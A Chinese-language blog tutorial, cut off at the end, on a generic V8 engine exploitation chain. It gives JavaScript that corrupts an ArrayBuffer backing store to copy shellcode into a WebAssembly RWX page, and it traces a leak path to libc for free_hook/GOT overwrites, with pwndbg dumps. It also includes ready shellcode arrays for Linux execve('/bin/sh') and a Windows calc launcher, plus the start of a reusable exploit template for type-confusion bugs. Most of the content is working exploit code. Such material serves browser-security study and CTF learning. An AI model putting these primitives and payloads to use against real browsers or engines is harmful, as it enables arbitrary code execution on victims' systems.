<p>可以注意到，JSDataView 的 buffer 指向了 JSArrayBuffer，而 JSArrayBuffer 的 backing_store 则指向了实际的数据储存地址，那么如果我们能够写 backing_store 为 shellcode 内存段，就可以通过 JSDataView 的 setFloat64 方法直接写入了</p>
<p>而该成员在 data_buf+0x1C 处</p>
<blockquote>
<p>每个成员的地址偏移都会因为版本而迁移，这一点还请读者以自己手上的版本为准</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode_write</span>(<span class="params">addr,shellcode</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(shellcode.<span class="property">lenght</span>*<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line">	<span class="keyword">var</span> buf_backing_store_addr=<span class="title function_">addressOf</span>(data_buf)+<span class="number">0x18n</span>;</span><br><span class="line">	<span class="title function_">write64_addr</span>(buf_backing_store_addr,addr);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;shellcode.<span class="property">length</span>;++i)</span><br><span class="line">		data_view.<span class="title function_">setFloat64</span>(i*<span class="number">8</span>,<span class="title function_">int_to_float</span>(shellcode[i]),<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该函数需要根据实际情况自行修改，示例代码仅做了一些逻辑抽象 并且由于数据压缩的原因，获取 buf_backing_store_addr 的操作有可能不只是一次 addressOf 即可完成的，需要将低位和高位分别读出然后合并为 64 位地址后再写入，这里只做逻辑抽象，具体实践在以后的章节中另外补充</p>
</blockquote>
<p>根据上述的思路，我们可以写出<code>copy_shellcode_to_rwx</code>函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copy_shellcode_to_rwx</span>(<span class="params">shellcode, rwx_addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(shellcode.<span class="property">length</span> * <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line">  <span class="keyword">var</span> buf_backing_store_addr_lo = <span class="title function_">addressOf</span>(data_buf) + <span class="number">0x18n</span>;</span><br><span class="line">  <span class="keyword">var</span> buf_backing_store_addr_up = buf_backing_store_addr_lo + <span class="number">0x8n</span>;</span><br><span class="line">  <span class="keyword">var</span> lov = <span class="title function_">d2u</span>(<span class="title function_">read64</span>(buf_backing_store_addr_lo))[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">var</span> rwx_page_addr_lo = <span class="title function_">u2d</span>(lov, <span class="title function_">d2u</span>(rwx_addr)[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">var</span> hiv = <span class="title function_">d2u</span>(<span class="title function_">read64</span>(buf_backing_store_addr_up))[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">var</span> rwx_page_addr_hi = <span class="title function_">u2d</span>(<span class="title function_">d2u</span>(rwx_addr, hiv)[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">ftoi</span>(<span class="title function_">u2d</span>(lov, hiv));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;buf_backing_store_addr: 0x&quot;</span>+<span class="title function_">hex</span>(buf_backing_store_addr));</span><br><span class="line"></span><br><span class="line">  <span class="title function_">write64</span>(buf_backing_store_addr_lo, <span class="title function_">ftoi</span>(rwx_page_addr_lo));</span><br><span class="line">  <span class="title function_">write64</span>(buf_backing_store_addr_up, <span class="title function_">ftoi</span>(rwx_page_addr_hi));</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; ++i)</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(i * <span class="number">8</span>, <span class="title function_">itof</span>(shellcode[i]), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是获取写入内存段的地址了，回到开始的这个脚本：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasmInstance);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x1ef0821046d</span></span><br><span class="line">0x1ef0821046d: [WasmInstanceObject] in OldSpace</span><br><span class="line"> - map: 0x01ef082448d9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x01ef080846d1 &lt;Object map = 0x1ef08244e51&gt;</span><br><span class="line"> - elements: 0x01ef080406e9 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x01ef08085e79 &lt;Module map = 0x1ef08244771&gt;</span><br><span class="line"> - exports_object: 0x01ef08085ff1 &lt;Object map = 0x1ef08244ef1&gt;</span><br><span class="line"> - native_context: 0x01ef08200f51 &lt;NativeContext[239]&gt;</span><br><span class="line"> - memory_object: 0x01ef08210455 &lt;Memory map = 0x1ef08244b81&gt;</span><br><span class="line"> - table 0: 0x01ef08085fc5 &lt;Table map = 0x1ef082449f1&gt;</span><br><span class="line"> - imported_function_refs: 0x01ef080406e9 &lt;FixedArray[0]&gt;</span><br><span class="line"> - indirect_function_table_refs: 0x01ef080406e9 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x01ef08085f7d &lt;Foreign&gt;</span><br><span class="line"> - memory_start: 0x7fe558000000</span><br><span class="line"> - memory_size: 65536</span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: 0x55b039645530</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55b039645550</span><br><span class="line"> - indirect_function_table_size: 0</span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: 0x01ef080406e9 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x1ef0821046d-1</span></span><br><span class="line">00:0000│  0x1ef0821046c ◂— 0x80406e9082448d9</span><br><span class="line">01:0008│  0x1ef08210474 ◂— 0x58000000080406e9</span><br><span class="line">02:0010│  0x1ef0821047c ◂— 0x1000000007fe5</span><br><span class="line">03:0018│  0x1ef08210484 ◂— 0xffff00000000</span><br><span class="line">04:0020│  0x1ef0821048c ◂— 0x6000000000</span><br><span class="line">05:0028│  0x1ef08210494 ◂— 0x80406e9000001ef</span><br><span class="line">06:0030│  0x1ef0821049c —▸ 0x55b039645530 —▸ 0x7fe75f96fbe0 (main_arena+96) —▸ 0x55b0396d11d0 ◂— 0</span><br><span class="line">07:0038│  0x1ef082104a4 ◂— 0x80406e9</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">08:0040│  0x1ef082104ac ◂— 0</span></span><br><span class="line">... ↓     2 skipped</span><br><span class="line">0b:0058│  0x1ef082104c4 —▸ 0x55b039645550 —▸ 0x7fe75f96fbe0 (main_arena+96) —▸ 0x55b0396d11d0 ◂— 0</span><br><span class="line">0c:0060│  0x1ef082104cc —▸ 0x1ef00000000 —▸ 0x7ffc9ba6d218 ◂— 0x1ef00000000</span><br><span class="line">0d:0068│  0x1ef082104d4 —▸ 0xed201826000 ◂— jmp 0xed201826380 /* 0xcccccc0000037be9 */</span><br><span class="line">0e:0070│  0x1ef082104dc ◂— 0x8085ff108085e79</span><br><span class="line">0f:0078│  0x1ef082104e4 ◂— 0x821045508200f51</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">10:0080│  0x1ef082104ec ◂— 0x804030d0804030d</span></span><br><span class="line">11:0088│  0x1ef082104f4 ◂— 0x804030d0804030d</span><br><span class="line">12:0090│  0x1ef082104fc ◂— 0x8085fe508085fb9</span><br><span class="line">13:0098│  0x1ef08210504 ◂— 0x804030d08085f7d</span><br><span class="line">14:00a0│  0x1ef0821050c ◂— 0x80406e908086029</span><br><span class="line">15:00a8│  0x1ef08210514 —▸ 0x1ef00000050 —▸ 0x7ffc9b976990 ◂— 0</span><br><span class="line">16:00b0│  0x1ef0821051c —▸ 0x55b039645570 —▸ 0x7fe75f96fbe0 (main_arena+96) —▸ 0x55b0396d11d0 ◂— 0</span><br><span class="line">17:00b8│  0x1ef08210524 —▸ 0x55b039645590 —▸ 0x7fe75f96fbe0 (main_arena+96) —▸ 0x55b0396d11d0 ◂— 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/picture%5CV8-%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE%5Cimage-20250614164017721.png" alt="image-20250614164017721"></p>
<p>可以注意到在 wasmInstance+0x68 处保存了内存段的起始地址，读取该处即可</p>
<h2 id="泄露地址手记"><a href="#泄露地址手记" class="headerlink" title="泄露地址手记"></a>泄露地址手记</h2><p>目前为止都是通过自定义一部分变量完成地址泄露的，但这个地址只是某个匿名内存段罢了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x271c08040000     0x271c0814d000 rw-p   10d000 0      [anon_271c08040]</span><br></pre></td></tr></table></figure>

<p>因为 WASM 是我们自己定义的，所以还能通过某些方法拿到地址，但如果我们现在不想写 shellcode，想像常规的 PWN 那样去写 free_hook 或者 GOT 表时，该如何泄露地址？</p>
<p>一个是随机泄露，从某个变量随机的往上一个个测试偏移地址，但很显然，在开启了 ASLR 的情况下，效率太低还不稳定，因此主要通过另外一个较为稳定的方式泄露地址：</p>
<p>JSArray结构体–&gt; Map结构体–&gt;constructor结构体–&gt;code属性地址–&gt;code内存地址的固定偏移处保存了 v8 的二进制指令地址–&gt;v8 的 GOT 表–&gt; libc基址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x34d808049979</span><br><span class="line">0x34d808049979: [JSArray]</span><br><span class="line"> - map: 0x34d808203ae1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x34d808203ae1</span><br><span class="line">0x34d808203ae1: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - constructor: 0x34d8081cbe85 &lt;JSFunction Array (sfi = 0x34d80814adc9)&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x34d8081cbe85</span><br><span class="line">0x34d8081cbe85: [Function] in OldSpace</span><br><span class="line"> - map: 0x34d808203a19 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - code: 0x34d800185501 &lt;Code BUILTIN ArrayConstructor&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tel 0x34d800185501-1+0x7EBAB00 30</span><br><span class="line">00:0000│  0x34d808040000 ◂— 0x40000</span><br><span class="line">01:0008│  0x34d808040008 ◂— 0x12</span><br><span class="line">02:0010│  0x34d808040010 —▸ 0x55cca1732560 ◂— 0x0</span><br><span class="line">03:0018│  0x34d808040018 —▸ 0x34d808042118 ◂— 0x608002205</span><br><span class="line">04:0020│  0x34d808040020 —▸ 0x34d808080000 ◂— 0x40000</span><br><span class="line">05:0028│  0x34d808040028 ◂— 0x3dee8</span><br><span class="line">06:0030│  0x34d808040030 ◂— 0x0</span><br><span class="line">07:0038│  0x34d808040038 ◂— 0x2118</span><br><span class="line">08:0040│  0x34d808040040 —▸ 0x55cca17b4258 —▸ 0x55cc9f7a5d20 —▸ 0x55cc9e9ba260 ◂— push   rbp</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x55cc9e121000     0x55cc9e954000 r--p   833000 0      /path/d8</span><br><span class="line">    0x55cc9e954000     0x55cc9f793000 r-xp   e3f000 832000 /path/d8</span><br><span class="line">    0x55cc9f793000     0x55cc9f7fb000 r--p    68000 1670000 /path/d8</span><br><span class="line">    0x55cc9f7fb000     0x55cc9f80c000 rw-p    11000 16d7000 /path/d8</span><br></pre></td></tr></table></figure>

<p>可以注意到，顺着这个地址链查下去，最终能找到地址 0x55cc9e9ba260 ，该地址对应了 d8 的二进制程序中的代码地址，而整个 d8 在内存中是连续的，因此可以找到其 GOT 表，然后再从中得到 libc 的机制，最后即可覆盖 free_hook 或 free 的 got 表为 system 或 one gadget</p>
<h2 id="可用的shellcode"><a href="#可用的shellcode" class="headerlink" title="可用的shellcode"></a>可用的shellcode</h2><p>在linux环境下，我们测试的时候想执行一下<code>execve(/bin/sh,0,0)</code>的shellcode，就可以这样：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">  <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">  <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">  <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"><span class="title function_">copy_shellcode_to_rwx</span>(shellcode, rwx_page_addr);</span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>

<p>如果想执行windows的弹计算器的shellcode，代码只需要改shellcode变量的值就好了，其他的就不用修改了：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0xc0e8f0e48348fcn</span>,</span><br><span class="line">    <span class="number">0x5152504151410000n</span>,</span><br><span class="line">    <span class="number">0x528b4865d2314856n</span>,</span><br><span class="line">    <span class="number">0x528b4818528b4860n</span>,</span><br><span class="line">    <span class="number">0xb70f4850728b4820n</span>,</span><br><span class="line">    <span class="number">0xc03148c9314d4a4an</span>,</span><br><span class="line">    <span class="number">0x41202c027c613cacn</span>,</span><br><span class="line">    <span class="number">0xede2c101410dc9c1n</span>,</span><br><span class="line">    <span class="number">0x8b20528b48514152n</span>,</span><br><span class="line">    <span class="number">0x88808bd001483c42n</span>,</span><br><span class="line">    <span class="number">0x6774c08548000000n</span>,</span><br><span class="line">    <span class="number">0x4418488b50d00148n</span>,</span><br><span class="line">    <span class="number">0x56e3d0014920408bn</span>,</span><br><span class="line">    <span class="number">0x4888348b41c9ff48n</span>,</span><br><span class="line">    <span class="number">0xc03148c9314dd601n</span>,</span><br><span class="line">    <span class="number">0xc101410dc9c141acn</span>,</span><br><span class="line">    <span class="number">0x244c034cf175e038n</span>,</span><br><span class="line">    <span class="number">0x4458d875d1394508n</span>,</span><br><span class="line">    <span class="number">0x4166d0014924408bn</span>,</span><br><span class="line">    <span class="number">0x491c408b44480c8bn</span>,</span><br><span class="line">    <span class="number">0x14888048b41d001n</span>,</span><br><span class="line">    <span class="number">0x5a595e58415841d0n</span>,</span><br><span class="line">    <span class="number">0x83485a4159415841n</span>,</span><br><span class="line">    <span class="number">0x4158e0ff524120ecn</span>,</span><br><span class="line">    <span class="number">0xff57e9128b485a59n</span>,</span><br><span class="line">    <span class="number">0x1ba485dffffn</span>,</span><br><span class="line">    <span class="number">0x8d8d480000000000n</span>,</span><br><span class="line">    <span class="number">0x8b31ba4100000101n</span>,</span><br><span class="line">    <span class="number">0xa2b5f0bbd5ff876fn</span>,</span><br><span class="line">    <span class="number">0xff9dbd95a6ba4156n</span>,</span><br><span class="line">    <span class="number">0x7c063c28c48348d5n</span>,</span><br><span class="line">    <span class="number">0x47bb0575e0fb800an</span>,</span><br><span class="line">    <span class="number">0x894159006a6f7213n</span>,</span><br><span class="line">    <span class="number">0x2e636c6163d5ffdan</span>,</span><br><span class="line">    <span class="number">0x657865n</span>,</span><br><span class="line">];</span><br><span class="line"><span class="title function_">copy_shellcode_to_rwx</span>(shellcode, rwx_page_addr);</span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>

<p>在上面的示例代码中，出现了几个没说明的函数，以下是这几个函数的代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(f64.<span class="property">buffer</span>);</span><br><span class="line"><span class="keyword">var</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(f64.<span class="property">buffer</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi</span>(<span class="params">f</span>)</span><br><span class="line">&#123;</span><br><span class="line">  f64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">itof</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">lo, hi</span>) &#123;</span><br><span class="line">  u32[<span class="number">0</span>] = lo;</span><br><span class="line">  u32[<span class="number">1</span>] = hi;</span><br><span class="line">  <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">v</span>) &#123;</span><br><span class="line">  f64[<span class="number">0</span>] = v;</span><br><span class="line">  <span class="keyword">return</span> u32;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为在上述思路中，都是使用浮点型数组，其值为浮点型，但是浮点型的值我们看着不顺眼，设置值我们也是习惯使用十六进制值。所以需要有<code>ftoi</code>和<code>itof</code>来进行浮点型和64bit的整数互相转换。</p>
<p>但是因为在新版的v8中，有压缩高32bit地址的特性，所以还需要<code>u2d</code>和<code>d2u</code>两个，把浮点型和32bit整数进行互相转换的函数。</p>
<p>最后还有一个<code>hex</code>函数，就是方便我们查看值：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>目前在我看来，不说所有v8的漏洞，但是所有类型混淆类的漏洞都能使用同一套模板：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span 